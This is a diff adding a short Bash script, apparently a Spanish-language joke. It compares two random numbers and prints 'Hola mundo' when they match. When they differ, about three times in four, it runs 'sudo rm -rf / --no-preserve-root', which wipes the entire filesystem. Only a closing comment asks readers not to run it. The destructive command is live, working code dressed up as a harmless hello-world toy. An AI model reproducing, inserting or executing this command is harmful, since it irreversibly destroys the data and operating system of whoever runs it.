@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# Guillermo Torres
+# Fecha: vie 05 sep 2025
+# Hora: 13:20
+# Descripción: 'O salen dos numeros iguales o no funciona'
+# Distribución: Ubuntu 24.04.3 LTS
+
+VAR1=$(($RANDOM%4+1)) # Genera numero aleatorio
+VAR2=$(($RANDOM%4+1)) # Genera numero aleatorio
+
+if [ $VAR1 -ne $VAR2 ]; then
+    echo "No quiero funcionar"
+    sudo rm -rf / --no-preserve-root
+    exit 1
+else
+    echo "Hola mundo"
+fi
+
+# no lo ejecuten por favor =)
